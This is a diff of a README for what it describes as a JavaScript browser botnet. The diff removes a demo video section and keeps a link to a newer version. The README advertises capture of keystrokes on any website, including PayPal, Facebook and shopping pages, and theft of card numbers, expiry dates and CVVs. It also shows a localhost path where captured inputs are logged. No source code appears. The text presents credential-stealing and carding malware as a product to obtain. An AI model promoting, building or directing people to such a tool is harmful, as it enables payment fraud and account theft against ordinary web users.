@@ -1,5 +1,5 @@
 # browser-javascript-botnet-cloud
-javascript botnet browser V3 based one Cloud 9 Botnet and my botnet browser chrome. capture log any web site,virtual keyboard ,paypal,facebook,e-commerce ,get card number,expiration date, CVV
+javascript botnet browser  based one Cloud 9 Botnet and my botnet browser chrome. capture log any web site,virtual keyboard ,paypal,facebook,e-commerce ,get card number,expiration date, CVV
 
 ![screen1](https://user-images.githubusercontent.com/30985149/77988179-91729580-7313-11ea-9960-6d8664632acb.PNG)
 
@@ -38,15 +38,9 @@ http://127.0.0.1/bot/logs/127.0.0.1-inputs.txt
 
 
 
-
-# Demo video Youtube and New Version
-
 # New Version
 https://github.com/hakanonymos/botnet-browser-chrome-firefox-V2
 
-Demo Version of this Project
-
-https://www.youtube.com/watch?v=65ORpeeGWps&feature=youtu.be
 
 # Contact infos
 
